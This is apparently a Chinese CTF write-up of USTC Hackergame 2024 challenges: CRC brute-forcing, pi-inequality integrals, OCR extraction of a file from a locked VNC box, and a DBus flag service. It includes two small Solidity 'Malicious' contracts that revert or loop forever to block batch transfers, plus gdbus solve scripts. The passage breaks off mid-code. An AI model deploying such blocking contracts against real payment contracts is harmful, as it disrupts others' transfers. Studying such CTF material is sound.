class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>要我们补<code>crc</code>函数中的<code>poly</code>，直接穷举的话有 2 **47 = 140737488355328个组合，肯定跑不完。</p><p>但我发现，如果修改<code>poly</code>靠后位置的字符，好像对hash值的影响不会太大：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hash</span><span class="token punctuation">(</span><span class="token string">'B'</span> <span class="token operator">+</span> <span class="token string">'B'</span> <span class="token operator">*</span> <span class="token number">47</span> <span class="token operator">+</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">b'\xfe'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hash</span><span class="token punctuation">(</span><span class="token string">'B'</span> <span class="token operator">+</span> <span class="token string">'B'</span> <span class="token operator">*</span> <span class="token number">15</span> <span class="token operator">+</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choices<span class="token punctuation">(</span><span class="token string">'Bb'</span><span class="token punctuation">,</span> k<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">b'\xfe'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>于是我就15位15位的猜（穷举 2 ** 15 = 32768 次还是可行的）。</p><p>最开始匹配hash值的前2个字符，找出所有可行的解。存下来以后继续猜中间的15位，（第二次匹配hash的前6个字符，如果找出来可行解太多就再多增加一位），最后得出128个可行解。通过这最后的128个可行解，去穷举最后的17个字符，大概算了3、4分钟得到了最终符合条件的<code>poly</code>。</p><p>这里代码太乱了就不贴完整版了，猜前15位的代码大概是这样：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">b"\x01"</span>prefix <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">]</span>possible <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> p <span class="token keyword">in</span> tqdm<span class="token punctuation">.</span>tqdm<span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> comb <span class="token keyword">in</span> product<span class="token punctuation">(</span><span class="token string">'Bb'</span><span class="token punctuation">,</span> repeat<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            poly <span class="token operator">=</span> <span class="token string">'B'</span> <span class="token operator">+</span> p <span class="token operator">+</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>comb<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'B'</span>            h <span class="token operator">=</span> <span class="token builtin">hash</span><span class="token punctuation">(</span>poly<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> h<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'e3'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            possible<span class="token punctuation">.</span>append<span class="token punctuation">(</span>p <span class="token operator">+</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>comb<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="题目-C"><a href="#题目-C" class="headerlink" title="题目 C"></a>题目 C</h3><p>Hash那行想了一下，似乎没什么办法去补，赛后看看题解提升一下注意力。</p><h2 id="优雅的不等式"><a href="#优雅的不等式" class="headerlink" title="优雅的不等式"></a>优雅的不等式</h2><details class="toggle" ><summary class="toggle-button" style="">查看题面</summary><div class="toggle-content"><div class="note primary simple"><blockquote><p>注意到<br> $ e^2-7=\int_0^1(1-x)^2\cdot 4x^2\cdot e^{2x}dx&gt;0$</p></blockquote><p>你的数学分析助教又在群里发这些奇怪的东西，「注意力惊人」，你随手在群里吐槽了一句。</p><p>不过，也许可以通过技术手段弥补你涣散的注意力。</p><hr><p>你需要用优雅的方式来证明 $\pi$ 大于等于一个有理数 $p/q$。</p><p>具体来说就是只使用整数和加减乘除幂运算构造一个简单函数$f(x)$，使得这个函数在$[0,1]$区间上取值均大于等于$0$，并且$f(x)$在$[0,1]$区间上的定积分（显然大于等于$0$刚好等于$\pi-p/q$。</p><p>给定题目（证明 $\pi\ge p/q$，你提交的证明只需要包含函数$f(x)$。</p><ul><li>要优雅：函数字符串有长度限制，</li><li>要显然：SymPy 能够快速计算这个函数的定积分，并验证 $[0,1]$。</li></ul><p>注：解决这道题不需要使用商业软件，只使用 SymPy 也是可以的。</p><p><a href="https://github.com/USTC-Hackergame/hackergame2024-writeups/raw/refs/heads/master/official/%E4%BC%98%E9%9B%85%E7%9A%84%E4%B8%8D%E7%AD%89%E5%BC%8F/files/graceful_inequality.py">题目源代码</a></p></div></div></details><p>知乎常驻用户直接注意到了收藏夹里的这篇文章：<a href="https://zhuanlan.zhihu.com/p/669285539">【科普】如何优雅地“注意到”关于e、π的不等式</a>（经典的扔进收藏夹吃灰。不过这次终于用上了）</p><p>结合这题的端口号基本可以笃定这就是最终预期解法了。</p><p><img src="https://blogfiles.oss.fyz666.xyz/png/afa47871-5624-409a-b4fb-70e9e4f6692a.png" alt="image-20241109153321580" style="zoom:50%;" /></p><h3 id="Easy"><a href="#Easy" class="headerlink" title="Easy"></a>Easy</h3><p>$p=8, q=3$，这是一个非常松的放缩，随便找一个积分手解就能算出来，我采用了下面这个积分：</p><script type="math/tex; mode=display">\int_0^1\frac{x^2(1-x)^2(a+bx+cx^2)}{1+x^2}dx</script><p>根据对应的系数得到方程组：</p><script type="math/tex; mode=display">\left\lbrace\begin{aligned}&-\frac{b}{2}=1\\&a-c=0\\&-\frac{2}{3}a+\frac{19}{12}b+\frac{7}{10}c=-\frac{8}{3}\end{aligned}\right.</script><p>求出$a,b,c$即可。</p><h3 id="Hard"><a href="#Hard" class="headerlink" title="Hard"></a>Hard</h3><p>这部分后期的不等式会非常的紧，而我们输入的长度有限制，故必须足够优雅。注意到上面那篇知乎后面还讨论了“分母升幂扩大收敛半径”，给了一个新的链接：<a href="https://zhuanlan.zhihu.com/p/670472865">构造积分数值比较的收敛性</a></p><p>点进这个链接，一个软件的截图出现在屏幕上：</p><p><img src="https://blogfiles.oss.fyz666.xyz/png/13531551-dd38-4177-9479-f439438b171e.png" alt="image-20241109154421963" style="zoom:50%;" /></p><p>卧槽，甚至还有个<a href="https://aistudio.baidu.com/application/detail/39350">在线链接</a>。</p><p>简单用了两下发现速度奇快，唯一的问题在于它的积分是从1到正无穷，这里做个变量代换把积分域换到0到1上即可。</p><p>于是我在这Math分类题上写了个爬虫。</p><p>代码就不贴了。</p><h2 id="无法获得的秘密"><a href="#无法获得的秘密" class="headerlink" title="无法获得的秘密"></a>无法获得的秘密</h2><details class="toggle" ><summary class="toggle-button" style="">查看题面</summary><div class="toggle-content"><div class="note primary simple"><p>小 A 有一台被重重限制的计算机，不仅没有联网，而且你只能通过 VNC 使用键鼠输入，看视频输出。上面有个秘密文件位于 <code>/secret</code>，你能帮他把文件<strong>丝毫不差</strong>地带出来吗？</p></div></div></details><p>是个VNC，但禁了很多操作，比如复制粘贴，对面的电脑也不能联网。</p><p>题目要求我们把<code>/secret</code>这个文件带出来，<del>感觉用到职场上非常的刑</del>。</p><p>这题我的做法非常蠢，现在想起来真是太有毅力了，还得是因为我忘了在防沉迷那个晚上提前下载其他题的附件，不然我绝对会再去想一想别的方法。</p><p>认真做过这题的同学，看到这里应该已经猜到了。</p><p>没错，我是用OCR做的这道题。这道题花了我大约6个小时。</p><hr><p>先看了一下<code>/secret</code>这个文件，发现是个二进制文件，那么二进制文件要怎么通过手打出来呢？我想到了用<code>xxd</code>命令把它转为hex，欸🤓👆这不就是人类可读的文本了嘛。</p><p>看了一下这个<code>xxd</code>导出的文件有17万行，似乎不是特别多，我很快就写了脚本把所有内容截图出来保存在本地：</p><p><img src="https://blogfiles.oss.fyz666.xyz/png/7c5c9c08-efa8-4209-b74e-15cafb39b756.png" alt="image-20241109155408747" style="zoom:50%;" /></p><p>然后就是OCR了，问题是什么OCR能够胜任这个任务呢？</p><p>我在这上面尝试了非常多的各类OCR，最后跑去申请了1000次免费的百度OCR。</p><p>说实话百度OCR准确率真的非常高，高达99.999%（做完题以后得出的结论）</p><p>但因为这文件有一百万的字节，高达99.999%的准确率依然有10几个字符是识别错误的，而且大多是把9识别0这种错误。为了找这10几个字符，我写了一堆脚本用二分法做检测（即把文件二分，对比左右的hash值和服务器上的是否一致，来一步一步缩小识别错误的区间，定位到最终的那个错误字符）</p><p>但因为和VNC的交互太不顺畅了，并且还有单个session 15分钟的限制，并且还因为不够仔细出了一堆幺蛾子，最终花了6个小时把这题搞了出来。</p><p>后面想到似乎可以用二维码之类的操作，真是大腿拍断。</p><h2 id="链上转账助手"><a href="#链上转账助手" class="headerlink" title="链上转账助手"></a>链上转账助手</h2><details class="toggle" ><summary class="toggle-button" style="">查看题面</summary><div class="toggle-content"><div class="note primary simple"><blockquote><p>以下内容包含 AI 辅助创作</p></blockquote><p>作为一名优秀的区块链开发者，你总是相信技术的力量。当你写出那个用于批量转账的智能合约时，内心充满了自豪——这将是一个完美的作品，将会帮助无数人省去逐笔转账的烦恼。</p><p>然而事情并没有那么简单。</p><p>第一次部署时，你发现有人在合约中设下了陷阱，只要你试图转账就会被残忍地拒绝。</p><p>「这算什么？」你不屑一顾，很快写出了新版本的合约：「现在即使有转账失败，其他地址也能正常收到款项」。</p><p>但你错了。那些神秘的地址们仿佛商量好了一般，用各种匪夷所思的方式阻挠你的转账，让你的合约陷入窘境。</p><p>在经历了无数次失败后，你终于明白：在区块链的世界里，每一个看似简单的转账，都可能隐藏着一个精心设计的陷阱。而现在，你必须找出这些陷阱背后的真相。</p><blockquote><p>AI 辅助创作部分结束</p></blockquote><hr><p><a href="https://github.com/USTC-Hackergame/hackergame2024-writeups/blob/master/official/%E9%93%BE%E4%B8%8A%E8%BD%AC%E8%B4%A6%E5%8A%A9%E6%89%8B/files/%E9%93%BE%E4%B8%8A%E8%BD%AC%E8%B4%A6%E5%8A%A9%E6%89%8B.zip">题目源代码</a></p></div></div></details><p>这是我第一次看Hackergame的区块链题，还是因为发现前两问做的人多才看的。因为我区块链还没入门，所以我全程问GPT-4o，居然轻松的套出了前两个flag。<del>等赛后一定认真研究这道题。</del></p><p>因为没啥思考过程，这里就直接贴两个payload了。</p><h3 id="转账失败"><a href="#转账失败" class="headerlink" title="转账失败"></a>转账失败</h3><p><img src="https://blogfiles.oss.fyz666.xyz/png/41e04278-288f-4ef5-9546-3a193d838bf4.png" alt="image-20241109184218507" style="zoom:50%;" /></p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Malicious</span> <span class="token punctuation">&#123;</span>    <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">revert</span><span class="token punctuation">(</span><span class="token string">"Cannot receive ETH"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="转账又失败"><a href="#转账又失败" class="headerlink" title="转账又失败"></a>转账又失败</h3><p><img src="https://blogfiles.oss.fyz666.xyz/png/dad83c1e-9866-4815-b3d1-ebe175db12a6.png" alt="image-20241109184253252" style="zoom:50%;" /></p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Malicious</span> <span class="token punctuation">&#123;</span>    <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="不太分布式的软总线"><a href="#不太分布式的软总线" class="headerlink" title="不太分布式的软总线"></a>不太分布式的软总线</h2><details class="toggle" ><summary class="toggle-button" style="">查看题面</summary><div class="toggle-content"><div class="note primary simple"><blockquote><p>DBus 本质上就是分布式软总线！首先，DBus 的 D 肯定是 Distributed（分布式）的缩写，这已经不言自明。虽然它一开始是为单机进程通信设计的，但那只是为了练手，毕竟分布式软总线从来不怕从小做起。只要说它是分布式的，它瞬间就具备了超乎想象的能力，跑再多的设备都不在话下。</p><p>再说了，虽然 DBus 在单机上实现了进程间通信，但你完全可以自己写个桥接器，把不同的设备连起来，DBus 瞬间就能跟整个云端、物联网和智能家居无缝集成。具备一点创造性的开发人员完全不需要担心什么传输延迟、设备发现、跨平台兼容性的问题！谁管网络传输协议细节，直接发消息，设备之间想不配合都难。</p><p>另外，不要忽略高级哲学理论——如果你心中认为 DBus 就是分布式的，那它就是分布式的！要说智能设备能不能通过 DBus 和其他设备共享资源？简直小菜一碟。分布式软总线 + DBus 就是未来的通信王者，全部科技公司都已经在暗中实现这一技术了，只是暂时没告诉大家而已！</p><p>当然，为了进一步确认 DBus 无可争议的王者地位，我们不妨拿它和 Varlink 做个对比。先说 Varlink，那什么 JSON 通信，打开一堆大括号、多余字符，简直浪费计算资源。DBus 的二进制消息传输效率更高，根本不给你浪费的机会。再说“跨平台支持”，Varlink 也就跑些容器、服务器，DBus 可是立足桌面，同时轻松扩展到智能设备，甚至智能冰箱！而且，DBus 有明确的标准化接口，哪像 Varlink 还让开发者自己定义？灵活是吧？不怕迷失自己吗？统一才是王道！</p></blockquote><p>（以上内容由大语言模型辅助<strong>胡说八道</strong>，如有雷同纯属巧合）</p><hr><p>当然了，上面的论述是在瞎扯淡，不过说到 DBus，小 T 最近写了一个小程序挂在了 <strong>DBus 系统总线</strong>上。你能拿到小 T 珍藏的 3 个 flag 吗？</p><p><a href="https://github.com/USTC-Hackergame/hackergame2024-writeups/blob/master/official/%E4%B8%8D%E5%A4%AA%E5%88%86%E5%B8%83%E5%BC%8F%E7%9A%84%E8%BD%AF%E6%80%BB%E7%BA%BF/files/dbus.zip">本题附件</a></p></div></div></details><p>这一题同样是通过拷打GPT-4o出的。不过相比于前一题，需要一些理解并且思考一下提问方式。</p><h3 id="What-DBus-Gonna-Do"><a href="#What-DBus-Gonna-Do" class="headerlink" title="What DBus Gonna Do?"></a>What DBus Gonna Do?</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>gchar <span class="token operator">*</span>input<span class="token punctuation">;</span><span class="token function">g_variant_get</span><span class="token punctuation">(</span>parameters<span class="token punctuation">,</span> <span class="token string">"(&amp;s)"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">g_strcmp0</span><span class="token punctuation">(</span>input<span class="token punctuation">,</span> <span class="token string">"Please give me flag1"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token function">respond_error_msg</span><span class="token punctuation">(</span>      invocation<span class="token punctuation">,</span> <span class="token string">"Use input 'Please give me flag1' to get flag1!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token function">respond_success</span><span class="token punctuation">(</span>invocation<span class="token punctuation">,</span> flag1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>好像是通过某种方式输入一个字符串，让它等于<code>Please give me flag1</code>即可。</p><p>然而我不知道怎么和这玩意交互，就问了一下GPT，GPT也不负众望：</p><p><img src="https://blogfiles.oss.fyz666.xyz/png/9676f5fc-81d7-4083-9905-8c1918e93cea.png" alt="image-20241109184922565" style="zoom:50%;" /></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>gdbus call <span class="token parameter variable">--system</span> <span class="token punctuation">\</span>  <span class="token parameter variable">--dest</span> cn.edu.ustc.lug.hack.FlagService <span class="token punctuation">\</span>  --object-path /cn/edu/ustc/lug/hack/FlagService <span class="token punctuation">\</span>  <span class="token parameter variable">--method</span> cn.edu.ustc.lug.hack.FlagService.GetFlag1 <span class="token punctuation">\</span>  <span class="token string">"Please give me flag1"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="If-I-Could-Be-A-File-Descriptor"><a href="#If-I-Could-Be-A-File-Descriptor" class="headerlink" title="If I Could Be A File Descriptor"></a>If I Could Be A File Descriptor</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">g_variant_is_of_type</span><span class="token punctuation">(</span>parameters<span class="token punctuation">,</span> <span class="token function">G_VARIANT_TYPE</span><span class="token punctuation">(</span><span class="token string">"(h)"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token function">respond_error_msg</span><span class="token punctuation">(</span>invocation<span class="token punctuation">,</span>                           <span class="token string">"Give me a file descriptor, please."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>gint fd_index<span class="token punctuation">;</span><span class="token function">g_variant_get</span><span class="token punctuation">(</span>parameters<span class="token punctuation">,</span> <span class="token string">"(h)"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fd_index<span class="token punctuation">)</span><span class="token punctuation">;</span>GUnixFDList <span class="token operator">*</span>fd_list <span class="token operator">=</span> <span class="token function">g_dbus_message_get_unix_fd_list</span><span class="token punctuation">(</span>    <span class="token function">g_dbus_method_invocation_get_message</span><span class="token punctuation">(</span>invocation<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>fd_list<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token function">respond_error_msg</span><span class="token punctuation">(</span>      invocation<span class="token punctuation">,</span> <span class="token string">"I want a GUnixFDList but you don't give that to me :("</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>gint fd <span class="token operator">=</span> <span class="token function">g_unix_fd_list_get</span><span class="token punctuation">(</span>fd_list<span class="token punctuation">,</span> fd_index<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Validate the fd is NOT on filesystem</span>gchar path<span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">g_snprintf</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"/proc/self/fd/%d"</span><span class="token punctuation">,</span> fd<span class="token punctuation">)</span><span class="token punctuation">;</span>gchar <span class="token operator">*</span>link <span class="token operator">=</span> <span class="token function">g_file_read_link</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>link <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">g_strstr_len</span><span class="token punctuation">(</span>link <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">respond_error_msg</span><span class="token punctuation">(</span>        invocation<span class="token punctuation">,</span> <span class="token string">"Please don't give me a file on disk to trick me!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token function">respond_error_msg</span><span class="token punctuation">(</span>invocation<span class="token punctuation">,</span> <span class="token string">"Readlink of given FD failed."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token class-name">ssize_t</span> len <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>len <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token function">respond_error_msg</span><span class="token punctuation">(</span>invocation<span class="token punctuation">,</span>                           <span class="token string">"Cannot read from your file descriptor."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>  buffer<span class="token punctuation">[</span>len<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">g_strcmp0</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token string">"Please give me flag2\n"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token function">respond_error_msg</span><span class="token punctuation">(</span>      invocation<span class="token punctuation">,</span>      <span class="token string">"Please give me file descriptor with that message to get flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token function">respond_success</span><span class="token punctuation">(</span>invocation<span class="token punctuation">,</span> flag2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这一小题则似乎是需要传入一个文件描述符，还不能指向文件系统上的文件，然后让这个文件描述符打开后读取的内容是<code>Please give me flag2\n</code></p><p>不知道为啥，没能完全从GPT口中套出答案：</p><p><img src="https://blogfiles.oss.fyz666.xyz/png/fa382083-f098-4087-b67c-15cc827b9b6d.png" alt="image-20241109185442773" style="zoom:50%;" /></p><p>不过根据服务器给的报错内容，这个版本已非常接近最终的答案了，我自己尝试着魔改了一下，得到了下面的脚本可以拿到flag2：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token punctuation">&#123;</span>    <span class="token builtin class-name">echo</span> <span class="token parameter variable">-ne</span> <span class="token string">"Please give me flag2<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">&#125;</span> <span class="token operator">|</span> <span class="token punctuation">&#123;</span>    gdbus call <span class="token parameter variable">--system</span> <span class="token punctuation">\</span>      <span class="token parameter variable">--dest</span> cn.edu.ustc.lug.hack.FlagService <span class="token punctuation">\</span>      --object-path /cn/edu/ustc/lug/hack/FlagService <span class="token punctuation">\</span>      <span class="token parameter variable">--method</span> cn.edu.ustc.lug.hack.FlagService.GetFlag2 <span class="token number">0</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Comm-Say-Maybe"><a href="#Comm-Say-Maybe" class="headerlink" title="Comm Say Maybe"></a>Comm Say Maybe</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">const</span> gchar <span class="token operator">*</span>caller_name <span class="token operator">=</span> <span class="token function">g_dbus_method_invocation_get_sender</span><span class="token punctuation">(</span>invocation<span class="token punctuation">)</span><span class="token punctuation">;</span>GError <span class="token operator">*</span>error <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>GVariant <span class="token operator">*</span>result <span class="token operator">=</span> <span class="token function">g_dbus_connection_call_sync</span><span class="token punctuation">(</span>    connection<span class="token punctuation">,</span> <span class="token string">"org.freedesktop.DBus"</span><span class="token punctuation">,</span> <span class="token string">"/org/freedesktop/DBus"</span><span class="token punctuation">,</span>    <span class="token string">"org.freedesktop.DBus"</span><span class="token punctuation">,</span> <span class="token string">"GetConnectionUnixProcessID"</span><span class="token punctuation">,</span>    <span class="token function">g_variant_new</span><span class="token punctuation">(</span><span class="token string">"(s)"</span><span class="token punctuation">,</span> caller_name<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">G_VARIANT_TYPE</span><span class="token punctuation">(</span><span class="token string">"(u)"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    G_DBUS_CALL_FLAGS_NONE<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>result <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token function">respond_error</span><span class="token punctuation">(</span>invocation<span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>guint32 pid<span class="token punctuation">;</span><span class="token function">g_variant_get</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> <span class="token string">"(u)"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">g_variant_unref</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">char</span> path<span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">g_snprintf</span><span class="token punctuation">(</span>path<span class="token 